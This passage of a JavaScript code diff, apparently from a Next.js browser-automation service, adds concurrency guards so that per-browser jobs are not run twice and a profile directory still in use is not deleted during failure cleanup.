+                                logger.warn(`[PROFILE][${browserId}] DELETING userDataDir reason=FAILED_FINAL_CLEANUP status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
                             }
                             await fs.remove(userDataDir);
                             logger.info(`[processRow][${browserId}] Successfully deleted user data directory: ${userDataDir}`);
@@ -5596,7 +5722,7 @@ async function processWaitingRows() {
 
             const cachedRow = getCachedRow(bId);
             const effectiveStatus = cachedRow?.status || status;
-            const shouldProcess = processableStatuses.includes(effectiveStatus) && !activeProcesses.has(bId);
+            const shouldProcess = processableStatuses.includes(effectiveStatus) && !activeProcesses.has(bId) && !jobMap.has(bId);
 
             if (shouldProcess) {
                 seenBidsThisRun.add(bId);
@@ -5836,7 +5962,7 @@ export async function POST(request) {
                 } else {
                     logger.info(`[POST][${browserId}] Wake-up: no active browser session. Starting fresh processRow.`);
                 }
-                if (activelyProcessing.has(browserId) || processRowsInFlight.has(browserId)) {
+                if (activelyProcessing.has(browserId) || jobMap.has(browserId) || activeProcesses.has(browserId)) {
                     logger.info(`[POST][${browserId}] Wake-up: processRow already actively processing this browserId. Skipping duplicate.`);
                     return setCorsHeaders(NextResponse.json({ success: true, message: "Already processing" }, { status: 200 }));
                 }
@@ -5993,7 +6119,11 @@ export async function POST(request) {
         if (finalEffectiveStatus === "FAILED" && userDataDir) {
             const session = activeBrowserSessions.get(currentBrowserId);
             if (!session || !session.browser?.isConnected()) {
-                try { await fs.remove(userDataDir); } catch (e) { if (e.code === 'EBUSY') logger.warn(`EBUSY deleting dir (POST FAILED for ${requestBrowserId || 'N/A'}): ${userDataDir}`); else logger.error(`Error deleting dir (POST FAILED for ${requestBrowserId || 'N/A'}): ${e.message}`); }
+                if (requestBrowserId && jobMap.has(requestBrowserId)) {
+                    logger.warn(`[POST][${requestBrowserId}] FAILED cleanup skipped: a processRow job is still in flight for this browserId (single-flight). Dir left for the owning job.`);
+                } else if (canDeleteUserDataDir(requestBrowserId)) {
+                    try { await fs.remove(userDataDir); } catch (e) { if (e.code === 'EBUSY') logger.warn(`EBUSY deleting dir (POST FAILED for ${requestBrowserId || 'N/A'}): ${userDataDir}`); else logger.error(`Error deleting dir (POST FAILED for ${requestBrowserId || 'N/A'}): ${e.message}`); }
+                }
             } else { logger.warn(`[POST][${requestBrowserId}] FAILED, but session active. Skipping dir delete.`); }
         }
         // Only clean up activeProcesses if this POST handler actually launched/reused a browser.
